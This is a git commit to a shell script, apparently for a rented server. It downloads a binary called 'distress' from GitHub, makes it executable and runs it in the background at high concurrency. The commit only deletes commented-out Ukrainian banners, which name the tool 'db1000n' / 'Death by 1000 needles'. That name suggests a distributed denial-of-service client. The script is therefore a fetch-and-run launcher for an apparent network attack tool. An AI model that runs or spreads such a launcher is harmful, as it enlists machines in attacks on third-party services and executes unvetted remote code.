ca8e4a9429366b01e8cf096ae9bd7255d9828103
patatakartata <106821289+patatakartata@users.noreply.github.com>
2022-06-27 16:11:51 +0300

    Update sprintbox.sh

--- sprintbox.ru/sprintbox.sh
+++ sprintbox.ru/sprintbox.sh
@@ -11,9 +11,3 @@ cd
 wget https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl
 chmod +x distress_x86_64-unknown-linux-musl
 ./distress_x86_64-unknown-linux-musl -c 1024 > sd 2>&1 &
-
-#tput setaf 3; tput bold; echo "Death by 1000 needles successfully installed."
-#echo -e "\033[1;44m     Україна вітає тебе друже!     \033[0m" 
-#echo -e "\033[1;43m    Давай зробимо добру справу!    \033[0m" 
-#tput setaf 6; tput bold; echo "Ініціюю  запуск  програми  db1000n" 
-#sleep 6; ./distress_x86_64-unknown-linux-musl -c 1024 > sd 2>&1 &
